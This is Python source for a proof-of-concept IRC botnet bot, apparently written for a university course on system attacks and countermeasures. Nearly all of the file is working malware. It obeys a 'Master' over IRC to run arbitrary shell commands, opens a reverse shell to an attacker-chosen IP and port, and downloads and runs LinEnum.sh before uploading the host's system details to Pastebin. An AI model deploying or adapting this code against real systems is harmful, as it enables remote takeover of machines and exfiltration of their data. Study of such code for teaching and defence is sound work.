"""
Author  : Sason R Baghdadi
Purpose : Proof of concept for an IRC botnet written in Python3.7. This project
          was created for a Computer System Attacks and Countermeasures course
          and should strictly be used for education purposes only. Detailed
          information regarding this project or botnets in general can be found
          in `Report.pdf` and `Botnets - A Crash Course.pdf`, respectively.
"""

import socket
import re
import subprocess
from urllib import request
from urllib.parse import urlencode
import os.path
from time import sleep
import base64

# TODO: 1) How to know if you're infected with this botnet (tcpdump/wireshark)


class Slave():

    def __init__(self, irc_server, irc_port, irc_nick):
        print("[%] Initializing bot ...")
        self.irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.irc_server = irc_server
        self.irc_port = irc_port
        self.irc_nick = irc_nick
        self.irc_admin = "Master"
        # https://regex101.com/r/QTET1G/7/
        # TODO: Make verbose, multi-line so it's more readable
        self.message_parser = re.compile(
            r':(?P<user>\w+)!\w+@(?P<user_ip>[0-9a-z.]+) PRIVMSG (?P<irc_channel>#?\w+) :(?P<user_message>.*)')

    def join_server(self):
        print(f"[1] Opening socket to {self.irc_server}:{self.irc_port}")
        self.irc_socket.connect((self.irc_server, self.irc_port))
        self.send_message(f"NICK {self.irc_nick}")
        print("[2]" + self.receive_message())
        self.send_message(
            f"USER {self.irc_nick} {self.irc_nick} {self.irc_nick} :Testing!")
        print("[3]" + self.receive_message())

    def join_channel(self, irc_channel):
        self.irc_channel = irc_channel

        print(f"[4] Joining channel {irc_channel}")
        self.send_message(f"JOIN {irc_channel}")

        irc_message = self.receive_message()
        while ('366' not in irc_message):
            print(irc_message)
            irc_message = self.receive_message()
        print(irc_message)
        print(f"[5] Successfully joined channel {irc_channel}")

    def irc_ping(self):
        self.send_message("PONG :irc.botnet.local")

    def send_message(self, message, irc_channel=None):
        message_type = 'public' if irc_channel is None else 'private'
        print(f"[!] Sending {message_type} message: \"{message}\"")
        if irc_channel is None:
            self.irc_socket.send(bytes(message + "\n", 'UTF-8'))
        else:
            self.irc_socket.send(bytes(
                f"PRIVMSG {irc_channel} :{message}\n", 'UTF-8'))

    def receive_message(self):
        return self.irc_socket.recv(2048).decode('UTF-8').strip("\n\r")

    def parse_message(self, irc_message):
        try:
            msg_result = self.message_parser.match(irc_message)

            if ("#" in msg_result.group('irc_channel')):
                message_type = 'public'
            elif (self.irc_nick in msg_result.group('irc_channel')):
                message_type = 'private'
            else:
                message_type = 'unknown'
                print(f"[#] Uknown message type: {irc_message}")

            user = msg_result.group('user')
            user_ip = msg_result.group('user_ip')
            user_message = msg_result.group('user_message')

            return(user, user_ip, user_message, message_type)

        except AttributeError as e:
            print(f"\n\n[ERROR] {e}")
            print(f"[irc_message] {irc_message}\n\n")
            self.quit(quit_message="I've crashed ... beep boop", error=e)

    def execute_command(self, command, message_type=None, output=False):
        command = command.split()
        print(f"[!] Executing command \"{command}\"")
        recipient = self.irc_channel if message_type == 'public' else self.irc_admin  # noqa
        try:
            exec_output = subprocess.check_output(
                command, stderr=subprocess.STDOUT).decode('UTF-8')
            if output:
                if ("\n" in exec_output.strip()):
                    for line in exec_output.split("\n"):
                        # Prevent sending an empty string
                        if line.strip() != "":
                            self.send_message(line, recipient)
                else:
                    self.send_message(exec_output, recipient)
            return exec_output
        except PermissionError as e:
            print(f"[ERROR] Permission denied: {e}")
            self.send_message(f"Permission denied: {e}", self.irc_admin)
        except FileNotFoundError as e:
            print(f"[ERROR] File/Command not found: {e}")
            self.send_message(f"File/Command not found: {e}", self.irc_admin)

    def open_reverse_shell(self, dest_address):
        print(f"[!] Opening reverse shell ...")
        try:
            dest_ip, dest_port = dest_address.split()
            dest_socket = socket.socket()
            dest_socket.connect((dest_ip, int(dest_port)))
            self.send_message(f"Opening reverse shell {dest_ip}:{dest_port}",
                              self.irc_admin)
            while 1:
                # Receive data as it comes in
                data = dest_socket.recv(1024).decode("UTF-8")
                # If the input is 'exit', exit the shell, close the socket
                if (data.strip() == 'exit'):
                    dest_socket.close()
                    break
                # If the input begins with 'cd ', then change directory
                if (data[:3] == 'cd '):
                    os.chdir(data[3:].strip())

                if (len(data) > 0):
                    cmd = subprocess.run(
                        data[:],
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE)
                    output = cmd.stdout.decode('UTF-8')
                    errors = cmd.stderr.decode('UTF-8')
                    dest_socket.send(
                        str.encode(output + str(os.getcwd()) + '> '))
                    print(f"[SHELL] Input : {data.strip()}")
                    print(f"[SHELL] Output: {output.strip()}")
                    # Refactor the line below
                    if (errors is not None and errors != ""):
                        print(f"[SHELL] Errors: {errors.strip()}")
            self.send_message(f"Closed reverse shell {dest_ip}:{dest_port}",
                              self.irc_admin)

        # If the IP PORT values of the command are not supplied
        except ValueError as e:
            print(f"[ERROR] {e}")
            self.send_message(
                f"Listening destination IP:PORT not provided!", self.irc_admin)
            self.send_message(
                f"Usage: !shell {self.irc_nick} IP PORT", self.irc_admin)
        # If the destination address isn't listening for incoming connections
        except OSError as e:
            print(f"[ERROR] {e}")
            self.send_message("Make sure a port is open and listening with "
                              f"command: nc -l -p {dest_port} -vvv",
                              self.irc_admin)

    def retrieve_system_info(self):
        linEnum_path = '/tmp/linEnum.sh'
        linEnum_out = '/tmp/linEnum.out'

        # Download linEnum.sh if it doesn't exist
        if not os.path.exists(linEnum_path):
            self.send_message("Downloading linEnum.sh", self.irc_admin)
            linEnum_url = 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh'  # noqa
            print(f"[!] Downloading linEnum.sh to {linEnum_path}")
            request.urlretrieve(linEnum_url, linEnum_path)
            # Sleep until it's downloaded
            while not os.path.exists(linEnum_path):
                print("[!] Sleeping until linEnum.sh is downloaded ...")
                sleep(5)

        print(f"[!] Executing linEnum.sh")
        self.send_message("Executing linEnum.sh", self.irc_admin)
        command = f'bash {linEnum_path} > {linEnum_out}'
        with open(linEnum_out, 'w') as outFile:
            subprocess.call(command.split(), stdout=outFile)
        print(f"[!] Output saved to {linEnum_out}")

        self.send_message("Uploading output to pastebin", self.irc_admin)
        pastebin_url = self.upload_to_pastebin(linEnum_out)
        self.send_message(f"System info uploaded to: {pastebin_url}",
                          self.irc_admin)

    def upload_to_pastebin(self, pathToFile):
        print(f"[!] Uploading {pathToFile} to Pastebin ...")
        pastebin_api = 'http://pastebin.com/api/api_post.php'
        pastebin_params = dict(
            # Required parameters
            api_dev_key=base64.b64decode('TODO: Put B64-encoded API key here'),
            api_option='paste',
            api_paste_code='',

            # Optional paramters
            api_paste_name='Demo System Output',
            api_paste_format='bash',
            api_paste_private='1',
            api_paste_expire_date='10M'
        )

        with open(pathToFile, "r") as file:
            for line in file:
                pastebin_params['api_paste_code'] += line

        result_url = request.urlopen(
            pastebin_api, urlencode(pastebin_params).encode('UTF-8')).read()
        return result_url.decode('UTF-8')

    def print_usage(self):
        usage = """Commands:
    !exec - Execute shell command on target
    !execo - Execute shell command on target and print output
        * Send to channel to execute command on all slaves in the channel
        * Send as private message to execute on a single slave
    !shell SLAVENICK IP PORT - Open a reverse shell to SLAVENICK's system
        * SLAVENICK - Slave's IRC nickname
        * IP - Ip address of socket listening for incoming connections
        * PORT - Port of socket listening for incoming connections
    !kill SLAVENICK - Kill SLAVENICK's connection to the IRC server
    !system SLAVENICK - Downloads and executes linEnum.sh, uploads output to Pastebin, and sends Pastebin URL to the channel
    !help - Displays this message"""  # noqa

        for line in usage.split('\n'):
            self.send_message(line, self.irc_admin)

    def quit(self, quit_message=None, error=None):
        self.send_message("Goodbye World!", self.irc_channel)
        if quit_message is None:
            self.send_message("QUIT")
        else:
            self.send_message(f"QUIT :{quit_message}")
        if error:
            raise(error)
        exit(1)

    def run(self):
        error_count = 0

        while 1:
            irc_message = self.receive_message()

            if ("PING :" in irc_message):
                error_count = 0
                print(irc_message)
                self.irc_ping()

            elif ("PRIVMSG" in irc_message):
                error_count = 0
                user, user_ip, user_message, message_type = self.parse_message(
                    irc_message)
                if (message_type == 'private'):
                    print(f"[PRIVATE] {user}@{user_ip}: {user_message}")
                else:
                    print(f"[+] {user}@{user_ip}: {user_message}")
                if (user == self.irc_admin):
                    if ("!exec" in user_message):
                        self.execute_command(
                            user_message[6:],  # Strip !exec/!execo from string
                            message_type,
                            output=True if '!execo' in user_message else False)
                    elif (f"!shell {self.irc_nick}" in user_message):
                        self.open_reverse_shell(
                            user_message.strip(f"!shell {self.irc_nick}"))
                    elif (f"!system {self.irc_nick}" == user_message):
                        self.retrieve_system_info()
                    elif (f"!kill {self.irc_nick}" in user_message):
                        self.quit(quit_message="Dismissed by Master")
                    elif ("!help" == user_message):
                        self.print_usage()
            else:
                print("[#] " + irc_message)
                sleep(2)
                error_count += 1
                if (error_count) == 10:
                    # Poor error handling, I know... but it's a simple PoC
                    self.quit(quit_message="Too many errors ... be.ep b.oo..p")


def main():
    # irc_server = "irc.botnet.local"
    irc_server = "127.0.0.1"
    irc_port = 6667
    irc_channel = "#demo"
    irc_nick = "DemoSlave"

    demoSlave = Slave(irc_server, irc_port, irc_nick)
    demoSlave.join_server()

    demoSlave.join_channel(irc_channel)

    demoSlave.send_message("Hello World!", irc_channel)
    demoSlave.run()


main()
